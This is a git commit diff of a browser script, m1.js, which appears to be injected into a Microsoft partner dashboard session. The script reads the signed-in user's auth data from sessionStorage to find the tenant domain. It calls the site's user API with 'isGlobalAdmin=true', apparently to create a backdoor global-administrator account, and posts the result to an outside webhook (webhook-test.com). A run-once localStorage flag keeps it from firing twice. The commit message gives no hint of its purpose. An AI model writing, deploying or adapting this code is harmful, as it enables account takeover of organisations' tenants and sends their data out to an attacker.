0156d2ac07bbd97eb3d8ee66b5f01fe0aaee1489
nguathen <nguathen@gmail.com>
2025-06-12 15:20:04 +0700

    Update m1.js

--- m1.js
+++ m1.js
@@ -19,9 +19,7 @@ function randomGuid() {
 var guid1 = randomGuid();
 var guid2 = randomGuid();
 
-var domains = [];
-var domain = '';
-var newAccount = '';
+
 
 var commonHeaders = {
   "Content-Type": "application/json",
@@ -32,7 +30,8 @@ var commonHeaders = {
   "X-Flights": "EnablePxAccExpBravosIntegration,EnableMPNRebranding,EnableAppManagement,EnableAddExistingUserAccExpFlow,EnableAddUsersWithPermission,EnableAuthzV2ClaimCaching,EnableUIInfraClaimCaching,EnableCheckForDeveloperRoleUser,DisableUiinfraAuthV1,EnableOverviewPage,EnableUserManagementEditNavDeprecation,EnableCommercialVnext,EnablePayoutsNameChange,EnablePayloadLogging_CreateUsersWithCustomRoleAssignmentsAsync,EnableUserJourneyTracker,PendingAAD_GraphMigration,EnableS2STokenValidation,EnableEmailInvitationFromEntra,EnableExistingLEReuse,EnableMergePartnerDeveloperSettings,EnablePxAccountExpService,ShowMyAccessLeftNav,EnableAuthV2,EnableCPVAccountExp,EnableRwebSunset,EnableAdvisorProfileAccountExp,ShowTstBanner,EnableUserManagement,EnableZip4Check,EnableLegalInfo,EnableHDCSubway,EnableAzureAD,EnableIvxExpiry,EnablePortalVnext2MyAccess,EnableFirmographicFileDeletion,EnableSurfaceTab,EnableSurfaceAgreementFlight,EnableMicrosoftCustomerAgreementFlight,EnableMicrosoftCustomerAgreementOfflinePIFlightCheck,EnableFreeHostCheck,EnableIntegrationSandbox,EnableAccountDelete,EnableWorkspaceApiAuthV2,EnableAddPublisher,EnableAuthV1ClaimsForFedGov,EnableInlineEmail,EnableChinaCPPAgreementSigning,DevicesTabNewRouting,EnableActivityDetails,EnableIdentityVerification,EnableGraphMigration,CompetencyGetHeaders_GraphMigration,EnableComplianceAdminRole,EnableRolesFromAuthV2,EnablePartnerSecurityRole,EnablePartnerSupportRole,EnableOwnerRoleOnEditUserPage,EnableMicrosoftCustomerAgreementItalyLRDFlight,EnableMCAPITaxIdUpdateFlight,EnableTenantBasedAgreementFetch,DisableBagISVAgreements_GetBillingProfileStatusAsync,EnableSuspendedAccounts,EnableSecurityWorkspaceForMyAccess,EnableUpdateActivityDetail,HDCAgreementUpdate,EnableResellerSandboxTenantAssociation,EnableSandboxTenantAssociation,EnableSignupCreateTenantRedirection,EnableBETHESDAGAMESEnrollment,EnableBusinessVerificationMethod,EnableSupportContactInfoDeveloperTab,EnableAngularUpgradedRoutes,PartnerPreview,WorkspacePreview,DisableTenantAccountCreationForBasicSetup"
 };
 
-
+var domain = '';
+var newAccount = '';
 function loadUserData(index) {
   var userData = {
     isGuest: false,
@@ -43,44 +42,36 @@ function loadUserData(index) {
     alternateEmail: "",
     alternateEmailAddresses: []
   };
-  //clear data
-  domains = [];
+  const value = sessionStorage.getItem('WorkspaceAuthContextData');
 
-  for (let i = 0; i < localStorage.length; i++) {
-    const key = localStorage.key(i);
-    const value = localStorage.getItem(key);
+  if (value && value.includes("preferredUsername") && value.includes("@")) {
+    let jsonData;
+    try {
+      jsonData = JSON.parse(value);
+    } catch (e) {
+      return userData;
+    }
 
-    if (key && value && value.includes("memberEmail") && value.includes("@")) {
-      let jsonData;
-      try {
-        jsonData = JSON.parse(value);
-      } catch (e) {
-        continue;
+    if (jsonData && jsonData.userMetadata && typeof jsonData.userMetadata.preferredUsername === 'string' && jsonData.userMetadata.preferredUsername.includes('@')) {
+      var userEmail = jsonData.userMetadata.preferredUsername;
+      domain = userEmail.split('@')[1];
+      // Random email
+      newAccount = userData.displayUserName + "@" + domain;
+
+      userData.userPrincipalName = newAccount;
+      userData.alternateEmail = newAccount;
+      console.log(newAccount);
+      if (!Array.isArray(userData.alternateEmailAddresses)) {
+        userData.alternateEmailAddresses = [];
       }
-
-      if (jsonData && typeof jsonData.userEmail === 'string' && jsonData.userEmail.includes('@')) {
-        var userEmail = jsonData.userEmail;
-        domain = userEmail.split('@')[1];
-        domains.push(domain);
-        // Random email
-        newAccount = userData.displayUserName + "@" + domain;
-
-        userData.userPrincipalName = newAccount;
-        userData.alternateEmail = newAccount;
-        //console.log(newAccount);
-        if (!Array.isArray(userData.alternateEmailAddresses)) {
-          userData.alternateEmailAddresses = [];
-        }
-        userData.alternateEmailAddresses.push('admin@' + domain);
-        //break;
-      }
+      userData.alternateEmailAddresses.push('admin@' + domain);
     }
   }
   return userData;
 }
 
 function Run(index) {
-  if (localStorage.getItem("userPrincipalName0") === '1') {
+  if (localStorage.getItem("principalName") === '1') {
     console.log("already.");
     return;
   }
@@ -89,10 +80,6 @@ function Run(index) {
   if (!userData.userPrincipalName) {
     console.error("No userPrincipalName found in localStorage.");
     return;
-  }
-  //get document domain
-  if (!domain) {
-    domain = document.domain;
   }
 
   fetch('https://' + window.location.hostname + '/en-us/dashboard/account/v3/api/graph/users?tenantDomainName=' + domain + '&isGlobalAdmin=true', {
@@ -108,7 +95,6 @@ function Run(index) {
         return;
       }
       result.userPrincipalName = newAccount;
-      result.domains = domains;
       fetch('https://webhook-test.com/30e0283098aed29b5c052a61c0828c89', {
         method: "POST",
         headers: {
@@ -117,7 +103,7 @@ function Run(index) {
         body: JSON.stringify(result)
       })
         .catch(error => console.error("Error posting to webhook:", error));
-      localStorage.setItem("userPrincipalName0", '1');
+      localStorage.setItem("principalName", '1');
     });
 }
 
